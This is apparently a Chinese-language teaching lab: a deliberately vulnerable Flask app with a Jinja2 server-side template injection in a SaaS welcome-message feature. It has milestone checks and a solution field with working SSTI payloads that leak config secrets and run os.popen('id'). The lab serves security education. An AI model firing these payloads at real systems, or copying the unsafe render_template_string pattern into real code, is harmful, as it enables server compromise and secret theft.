"""SaaS 后台的自定义欢迎语 —— Jinja2 服务端模板注入（SSTI）。

业务场景是"团队协作 SaaS"：管理员可以给团队配一句欢迎语，支持
`{{ user }}`、`{{ team }}` 这样的变量。问题在于，那段文本是被当成
**模板**去渲染的，而不是当成**字符串**去替换的。
"""

from vuln4all import Vuln, render_template, render_template_string, request, session

DEFAULT_TEMPLATE = "欢迎 {{ user }} 加入 {{ team }}！"

#: (里程碑名, 判定函数, 它证明了什么)
MILESTONES = (
    (
        "模板被求值",
        lambda out, tpl: "{{" in tpl and "49" in out,
        "输入 {{7*7}}，输出里出现 49 —— 说明服务端把你的输入当代码跑了",
    ),
    (
        "读到应用配置",
        lambda out, tpl: "SECRET_KEY" in out,
        "{{config}} 会把应用的配置整个渲染出来，包括密钥",
    ),
    (
        "拿到命令执行",
        lambda out, tpl: "uid=" in out or "root:" in out,
        "构造调用链拿到 os.popen —— 这一步之后服务器就是你的了",
    ),
)


class JinjaProfile(Vuln):
    info = {
        "name": "自定义欢迎语里的模板注入（SSTI）",
        "author": ["guaidao2"],
        "cwe": "CWE-1336",
        "owasp": "A03:2021 - Injection",
        "difficulty": "入门",
        "description": (
            "团队欢迎语是用 Jinja2 模板渲染的，而模板内容完全由用户控制。"
            "这不是「变量替换」，是真的在执行模板代码 —— 这是 Python 栈才有的经典坑。"
        ),
        "hint": (
            "先试试把欢迎语改成 `{{7*7}}` 保存。如果页面上出现的是 49，"
            "说明那段文本进了 Jinja2 引擎被求值了，而不是被当成普通字符串。"
            "接下来的方向：模板能访问哪些名字？（Flask 默认会往模板里塞不少东西）"
        ),
        "solution": (
            "一句一句往上打，页面会给你三个里程碑：\n\n"
            "1) {{7*7}}                     → 49，证明模板被求值\n"
            "2) {{config}}                  → 应用配置连同 SECRET_KEY 全漏出来\n"
            "3) {{ cycler.__init__.__globals__.os.popen('id').read() }}\n"
            "                               → 输出 uid=... 就是 RCE 了\n\n"
            "第 3 步的路子：Jinja2 里 cycler 是全局变量，它的 __init__ 是个 Python 函数，"
            "函数的 __globals__ 就是定义它的模块的全局命名空间 —— 那里有 os。\n"
            "拿到 os 之后，popen / system 想干什么都行。\n\n"
            "通用思路（不管什么上下文都值得先试）：\n"
            "  {{ ''.__class__.__mro__[1].__subclasses__() }}   ← 把能用的类全列出来\n"
            "  在输出里搜 subprocess.Popen / os._wrap_close，再顺着链子调。"
        ),
        "refs": [
            "https://portswigger.net/web-security/server-side-template-injection",
            "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/18-Testing_for_Server-side_Template_Injection",
        ],
    }

    # ---------------------------------------------------------------- 应用

    def create_app(self, ctx):
        app = ctx.flask(__name__)

        @app.route("/", methods=["GET", "POST"])
        def index():
            error = None
            rendered = None

            if request.method == "POST":
                template = request.form.get("template", "")
                session["template"] = template
                try:
                    # ↓↓↓ 洞就在这里：用户给的文本直接当模板渲染 ↓↓↓
                    rendered = render_template_string(
                        template, user="alice", team="安全组"
                    )
                    # ↑↑↑ 正确做法是用 render_template 渲染固定模板，把用户输入
                    #     当**变量**传进去；或者用 string.Template 做纯文本替换 ↑↑↑
                except Exception as exc:  # noqa: BLE001 - 模板抛什么都有可能
                    error = "%s: %s" % (type(exc).__name__, exc)

                if rendered is not None:
                    done = set(session.get("milestones", []))
                    for name, check, _why in MILESTONES:
                        if check(rendered, template):
                            done.add(name)
                    session["milestones"] = sorted(done)

            template = session.get("template", DEFAULT_TEMPLATE)
            done = set(session.get("milestones", []))

            return render_template(
                "index.html",
                template=template,
                rendered=rendered,
                error=error,
                milestones=[
                    {"name": name, "why": why, "done": name in done}
                    for name, _check, why in MILESTONES
                ],
                all_done=len(done) == len(MILESTONES),
            )

        @app.route("/reset-template")
        def reset_template():
            session.pop("template", None)
            session.pop("milestones", None)
            return render_template("index.html", template=DEFAULT_TEMPLATE,
                                   rendered=None, error=None, milestones=[],
                                   all_done=False)

        return {"": app}
